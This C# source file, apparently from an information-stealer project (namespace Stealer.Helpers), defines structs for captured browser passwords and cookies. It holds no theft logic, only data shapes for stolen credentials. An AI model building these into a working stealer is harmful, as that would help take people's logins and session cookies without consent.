namespace Stealer.Helpers
{
    internal sealed class Common
    {
        public struct Password
        {
            public string sUrl { get; set; }
            public string sUsername { get; set; }
            public string sPassword { get; set; }
        }

        internal struct Cookie
        {
            public string sHostKey { get; set; }
            public string sName { get; set; }
            public string sPath { get; set; }

            public string sExpiresUtc { get; set; }
            public string sKey { get; set; }
            public string sValue { get; set; }
            public string sIsSecure { get; set; }
        }
    }
}